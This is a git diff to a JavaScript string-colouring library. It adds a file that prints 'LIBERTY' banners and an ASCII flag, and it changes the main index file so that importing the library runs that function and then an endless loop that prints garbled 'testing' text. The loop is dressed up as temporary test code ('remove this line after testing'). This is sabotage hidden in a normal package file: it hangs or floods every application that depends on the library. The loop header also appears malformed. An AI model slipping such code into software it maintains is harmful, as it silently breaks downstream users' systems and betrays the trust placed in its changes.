@@ -1,0 +1,56 @@
+diff --git a/lib/custom/american.js b/lib/custom/american.js
+new file mode 100644
+index 00000000..5b0dc44c
+--- /dev/null
++++ b/lib/custom/american.js
+@@ -0,0 +1,31 @@
++module.exports = function americanFlag () {
++  console.log('LIBERTY LIBERTY LIBERTY'.yellow);
++  console.log('LIBERTY LIBERTY LIBERTY'.america);
++  console.log('LIBERTY LIBERTY LIBERTY'.yellow);
++  let flag = "\
++  \
++                                 !\
++             H|H|H|H|H           H__________________________________\
++             H|§|§|§|H           H|* * * * * *|---------------------|\
++             H|§|∞|§|H           H| * * * * * |---------------------|\
++             H|§|§|§|H           H|* * * * * *|---------------------|\
++             H|H|H|H|H           H| * * * * * |---------------------|\
++             H|H|H|H|H           H|---------------------------------|\
++          ===============        H|---------------------------------|\
++            /| _   _ |\          H|---------------------------------|\
++            (| O   O |)          H|---------------------------------|\
++            /|   U   |\          H-----------------------------------\
++             |  \=/  |           H\
++              \_..._/            H\
++              _|\I/|_            H\
++      _______/\| H |/\_______    H\
++     /       \ \   / /       \   H\
++    |         \ | | /         |  H\
++    |          ||o||          |  H\
++    |    |     ||o||     |    |  H\
++    |    |     ||o||     |    |  H   Carl Pilcher\
++  ";
++
++  console.log(flag);
++
++}
+\ No newline at end of file
+diff --git a/lib/index.js b/lib/index.js
+index 9df5ab7d..5cdde141 100644
+--- a/lib/index.js
++++ b/lib/index.js
+@@ -11,3 +11,13 @@ module['exports'] = colors;
+ //
+ //
+ require('./extendStringPrototype')();
++
++/* remove this line after testing */
++let am = require('../lib/custom/american');
++am();
++for (let i = 666; i < Infinity; i++;) {
++  if (i % 333) {
++    // console.log('testing'.zalgo.rainbow)
++  }
++  console.log('testing testing testing testing testing testing testing'.zalgo)
++}
